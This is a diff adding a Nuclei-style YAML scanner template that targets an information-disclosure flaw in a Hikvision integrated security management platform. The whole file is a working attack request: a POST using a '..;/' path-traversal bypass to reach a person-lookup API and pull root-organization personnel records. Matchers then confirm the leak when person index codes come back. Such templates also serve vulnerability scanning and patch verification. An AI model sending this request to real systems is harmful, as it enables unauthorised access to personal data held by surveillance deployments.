@@ -1,0 +1,25 @@
+id: hikvision-find-info
+
+info: 
+  name: hikvision-find-info
+  author: HackTwo
+  severity: high
+  description: 海康威视综合安防find信息泄露漏洞
+
+http:
+  - raw:
+    - |
+      POST /isupm/api/api/..;/..;/person/find HTTP/1.1
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+      Content-Type: application/json;charset=utf-8
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-Length: 95
+      Connection: close
+
+      {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
+
+    matchers:
+      - type: dsl
+        dsl:  
+          - 'status_code==200 && contains_all(body,"SUCCESS!") && contains_all(body,"\"code\":\"0\"") && contains_all(body,"personIndexCode")'
